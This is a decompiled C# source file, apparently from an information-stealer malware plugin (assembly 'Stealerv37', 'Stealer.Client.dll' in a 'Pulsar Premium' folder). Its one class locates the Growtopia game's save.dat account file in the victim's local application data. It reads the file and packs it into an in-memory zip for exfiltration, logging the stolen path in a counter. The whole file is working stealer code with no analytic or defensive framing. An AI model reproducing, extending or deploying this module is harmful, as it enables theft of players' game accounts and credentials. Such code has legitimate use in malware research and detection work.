// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Growtopia
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Games;

public class Growtopia : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Growtopia), "save.dat");
    if (!File.Exists(path))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Growtopia);
    string entryPath = "Growtopia\\save.dat";
    zip.AddFile(entryPath, File.ReadAllBytes(path));
    counterApplications.Files.Add($"{path} => {entryPath}");
    counter.Games.Add(counterApplications);
  }
}
